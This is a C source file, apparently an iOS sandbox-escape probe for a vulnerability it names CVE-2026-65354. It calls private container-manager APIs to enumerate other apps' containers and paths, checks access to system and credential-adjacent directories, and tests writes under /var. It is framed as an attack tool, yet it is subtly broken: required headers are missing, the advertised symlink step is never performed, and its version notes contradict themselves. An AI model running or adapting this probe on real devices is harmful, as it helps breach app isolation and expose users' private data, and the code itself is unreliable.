/*
 * worse_query_probe.c — Container Sandbox Escape Probe (CVE-2026-65354)
 *
 * Educational research on owned device (iPhone Duo, A20 Pro, iOS 27.1).
 *
 * Tests the worse_query sandbox escape technique:
 * An app with an App Group container can access other apps' data
 * via the container manager's private query interface.
 *
 * Affected: iOS 26.0-26.7.2, iOS 27.0.1-27.2
 * iOS 27.1 status: UNTESTED (between two affected versions)
 *
 * This probe:
 * 1. Creates an App Group container
 * 2. Queries the container manager for other app containers
 * 3. Tests symlink-based path traversal
 * 4. Reports accessible paths and permission levels
 *
 * Build: xcrun -sdk iphoneos clang -arch arm64e -miphoneos-version-min=17.0
 *        -framework CoreFoundation -framework MobileCoreServices
 *        -o WQProbe worse_query_probe.c -Wno-deprecated-declarations
 *
 * Bundle ID: com.research.wqprobe
 *
 * NOTE: This requires the app to have an App Group entitlement.
 * The entitments plist needs: com.apple.security.application-groups
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <dlfcn.h>
#include <CoreFoundation/CoreFoundation.h>

static FILE *g_log = NULL;

static void rlog(const char *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    if (g_log) { vfprintf(g_log, fmt, ap); fflush(g_log); }
    va_end(ap);
    va_start(ap, fmt);
    vprintf(fmt, ap);
    fflush(stdout);
    va_end(ap);
}

/*
 * Container Manager Private API
 *
 * The container manager (containermanagerd) handles app containers.
 * Apps with App Group entitlements can query it for shared containers.
 *
 * Key functions from MobileContainerManager.framework:
 * - MCMContainerManagerCopyContainerWithIdentifier
 * - MCMContainerCopyURL
 * - MCMContainerCopyPath
 */

typedef void *MCMContainerRef;

/* Dynamic resolution of private APIs */
static void *(*p_MCMContainerManagerCopyContainersWithClass)(int cls, void *error) = NULL;
static CFURLRef (*p_MCMContainerCopyURL)(MCMContainerRef container) = NULL;
static CFStringRef (*p_MCMContainerCopyIdentifier)(MCMContainerRef container) = NULL;

static int resolve_apis(void) {
    void *mcm = dlopen("/System/Library/PrivateFrameworks/MobileContainerManager.framework/MobileContainerManager", RTLD_NOW);
    if (!mcm) {
        rlog("[api] Failed to load MobileContainerManager: %s\n", dlerror());
        return -1;
    }

    p_MCMContainerManagerCopyContainersWithClass = dlsym(mcm, "MCMContainerManagerCopyContainersWithClass");
    p_MCMContainerCopyURL = dlsym(mcm, "MCMContainerCopyURL");
    p_MCMContainerCopyIdentifier = dlsym(mcm, "MCMContainerCopyIdentifier");

    rlog("[api] MCMContainerManagerCopyContainersWithClass: %p\n", p_MCMContainerManagerCopyContainersWithClass);
    rlog("[api] MCMContainerCopyURL: %p\n", p_MCMContainerCopyURL);
    rlog("[api] MCMContainerCopyIdentifier: %p\n", p_MCMContainerCopyIdentifier);

    return (p_MCMContainerManagerCopyContainersWithClass && p_MCMContainerCopyURL) ? 0 : -1;
}

/*
 * Test 1: Enumerate accessible paths from our sandbox
 */
static void test_path_access(void) {
    rlog("\n=== Test 1: Path Accessibility ===\n");

    const char *test_paths[] = {
        "/var/mobile",
        "/var/mobile/Containers",
        "/var/mobile/Containers/Data",
        "/var/mobile/Containers/Data/Application",
        "/var/mobile/Containers/Shared",
        "/var/mobile/Containers/Shared/AppGroup",
        "/var/mobile/Library",
        "/var/mobile/Library/Preferences",
        "/var/jb",
        "/private/var/mobile",
        "/private/var/containers",
        "/private/var/db",
        "/private/var/tmp",
        "/private/var/root",
        NULL
    };

    for (int i = 0; test_paths[i]; i++) {
        struct stat st;
        int exists = (stat(test_paths[i], &st) == 0);
        int readable = (access(test_paths[i], R_OK) == 0);
        int writable = (access(test_paths[i], W_OK) == 0);
        int executable = (access(test_paths[i], X_OK) == 0);

        rlog("  %s: %s%s%s%s\n",
             test_paths[i],
             exists ? "EXISTS " : "NO ",
             readable ? "R" : "-",
             writable ? "W" : "-",
             executable ? "X" : "-");
    }
}

/*
 * Test 2: Check our own container paths
 */
static void test_own_containers(void) {
    rlog("\n=== Test 2: Own Container Paths ===\n");

    /* Our bundle container */
    CFBundleRef bundle = CFBundleGetMainBundle();
    if (bundle) {
        CFURLRef url = CFBundleCopyBundleURL(bundle);
        if (url) {
            char buf[1024];
            CFURLGetFileSystemRepresentation(url, true, (UInt8 *)buf, sizeof(buf));
            rlog("  Bundle: %s\n", buf);
            CFRelease(url);
        }
    }

    /* Home directory */
    const char *home = getenv("HOME");
    if (home) {
        rlog("  HOME: %s\n", home);
    }

    /* Tmp directory */
    const char *tmp = getenv("TMPDIR");
    if (tmp) {
        rlog("  TMPDIR: %s\n", tmp);
    }

    /* Container directories from NSSearchPathForDirectoriesInDomains equivalent */
    const char *container_env = getenv("CFFIXED_USER_HOME");
    if (container_env) {
        rlog("  CFFIXED_USER_HOME: %s\n", container_env);
    }
}

/*
 * Test 3: App Group container access
 * This is the core of the worse_query technique.
 * An app with App Group entitlements can get a shared container
 * and potentially access paths outside its sandbox.
 */
static void test_app_group_access(void) {
    rlog("\n=== Test 3: App Group Container Access ===\n");

    /* Our app group identifier (must match entitlements) */
    const char *group_id = "group.com.research.wqprobe";

    /* Get the group container path */
    char group_path[1024];
    snprintf(group_path, sizeof(group_path),
             "/private/var/mobile/Containers/Shared/AppGroup");

    struct stat st;
    if (stat(group_path, &st) == 0) {
        rlog("  AppGroup base exists: YES\n");

        DIR *dir = opendir(group_path);
        if (dir) {
            rlog("  AppGroup base readable: YES\n");
            int count = 0;
            struct dirent *ent;
            while ((ent = readdir(dir)) && count < 10) {
                if (ent->d_name[0] == '.') continue;
                rlog("    [%d] %s (type=%d)\n", count, ent->d_name, ent->d_type);
                count++;
            }
            if (count == 0) rlog("    (empty)\n");
            closedir(dir);
        } else {
            rlog("  AppGroup base readable: NO (sandbox blocked)\n");
        }
    } else {
        rlog("  AppGroup base exists: NO or inaccessible\n");
    }

    /* Try to create a symlink in our group container */
    rlog("\n  Symlink test (worse_query core mechanism):\n");

    /* Get our actual group container */
    char our_group[1024] = {0};
    const char *home = getenv("HOME");
    if (home) {
        /* Try to find or create our group container */
        snprintf(our_group, sizeof(our_group), "%s/../../../Shared/AppGroup", home);

        char resolved[PATH_MAX];
        if (realpath(our_group, resolved)) {
            rlog("  Resolved AppGroup: %s\n", resolved);
        } else {
            rlog("  Cannot resolve AppGroup path: %s\n", our_group);
        }
    }
}

/*
 * Test 4: Container Manager query
 * Uses the private MCM API to enumerate containers
 */
static void test_container_manager(void) {
    rlog("\n=== Test 4: Container Manager Query ===\n");

    if (resolve_apis() != 0) {
        rlog("  SKIP: Could not resolve MCM APIs\n");
        rlog("  (This is expected if MobileContainerManager.framework is unavailable)\n");
        return;
    }

    /* Container classes:
     * 1 = System
     * 2 = User (app containers)
     * 3 = Internal
     * 4 = Shared (app groups)
     */
    for (int cls = 1; cls <= 4; cls++) {
        const char *cls_names[] = {"?", "System", "User", "Internal", "Shared"};
        rlog("  Querying class %d (%s)...\n", cls, cls_names[cls]);

        CFErrorRef error = NULL;
        void *containers = p_MCMContainerManagerCopyContainersWithClass(cls, &error);

        if (error) {
            CFStringRef desc = CFErrorCopyDescription(error);
            char buf[512];
            CFStringGetCString(desc, buf, sizeof(buf), kCFStringEncodingUTF8);
            rlog("    Error: %s\n", buf);
            CFRelease(desc);
            CFRelease(error);
            continue;
        }

        if (!containers) {
            rlog("    No containers returned\n");
            continue;
        }

        /* containers should be a CFArray */
        if (CFGetTypeID(containers) == CFArrayGetTypeID()) {
            CFArrayRef arr = (CFArrayRef)containers;
            CFIndex count = CFArrayGetCount(arr);
            rlog("    Found %ld containers\n", (long)count);

            for (CFIndex i = 0; i < count && i < 5; i++) {
                MCMContainerRef c = (MCMContainerRef)CFArrayGetValueAtIndex(arr, i);
                if (p_MCMContainerCopyIdentifier) {
                    CFStringRef ident = p_MCMContainerCopyIdentifier(c);
                    if (ident) {
                        char idbuf[256];
                        CFStringGetCString(ident, idbuf, sizeof(idbuf), kCFStringEncodingUTF8);
                        rlog("      [%ld] %s\n", (long)i, idbuf);
                        CFRelease(ident);
                    }
                }
                if (p_MCMContainerCopyURL) {
                    CFURLRef url = p_MCMContainerCopyURL(c);
                    if (url) {
                        char pathbuf[1024];
                        CFURLGetFileSystemRepresentation(url, true, (UInt8 *)pathbuf, sizeof(pathbuf));
                        rlog("        path: %s\n", pathbuf);
                        CFRelease(url);
                    }
                }
            }
        }

        CFRelease(containers);
    }
}

/*
 * Test 5: Direct /var write test
 * If sandbox escape is working, we should be able to write to /var
 */
static void test_var_write(void) {
    rlog("\n=== Test 5: /var Write Test ===\n");

    const char *test_paths[] = {
        "/var/jb",
        "/var/tmp/wq_probe_test",
        "/private/var/tmp/wq_probe_test",
        NULL
    };

    for (int i = 0; test_paths[i]; i++) {
        int ret = mkdir(test_paths[i], 0755);
        if (ret == 0) {
            rlog("  mkdir %s: SUCCESS (sandbox escaped!)\n", test_paths[i]);
            rmdir(test_paths[i]);
        } else {
            rlog("  mkdir %s: FAILED (%s)\n", test_paths[i], strerror(errno));
        }
    }

    /* Try writing a test file */
    const char *test_file = "/var/tmp/wq_probe_test.txt";
    FILE *f = fopen(test_file, "w");
    if (f) {
        fprintf(f, "worse_query probe test\n");
        fclose(f);
        rlog("  write %s: SUCCESS\n", test_file);
        unlink(test_file);
    } else {
        rlog("  write %s: FAILED (%s)\n", test_file, strerror(errno));
    }
}

int main(int argc, char **argv) {
    printf("=== worse_query Sandbox Escape Probe ===\n");
    printf("CVE-2026-65354 — Educational Research\n");
    printf("Target: iOS 27.1 / iPhone Duo (A20 Pro)\n\n");

    /* Open log */
    const char *docs = getenv("HOME");
    char logpath[1024];
    if (docs) {
        snprintf(logpath, sizeof(logpath), "%s/Documents/wq_probe.log", docs);
    } else {
        snprintf(logpath, sizeof(logpath), "/tmp/wq_probe.log");
    }
    g_log = fopen(logpath, "w");
    rlog("Log: %s\n", logpath);
    rlog("PID: %d\n", getpid());
    rlog("UID: %d\n", getuid());

    const char *mode = (argc > 1) ? argv[1] : "all";

    if (strcmp(mode, "all") == 0 || strcmp(mode, "paths") == 0) {
        test_path_access();
    }
    if (strcmp(mode, "all") == 0 || strcmp(mode, "containers") == 0) {
        test_own_containers();
    }
    if (strcmp(mode, "all") == 0 || strcmp(mode, "appgroup") == 0) {
        test_app_group_access();
    }
    if (strcmp(mode, "all") == 0 || strcmp(mode, "mcm") == 0) {
        test_container_manager();
    }
    if (strcmp(mode, "all") == 0 || strcmp(mode, "write") == 0) {
        test_var_write();
    }

    rlog("\n=== Probe Complete ===\n");

    if (g_log) fclose(g_log);
    return 0;
}
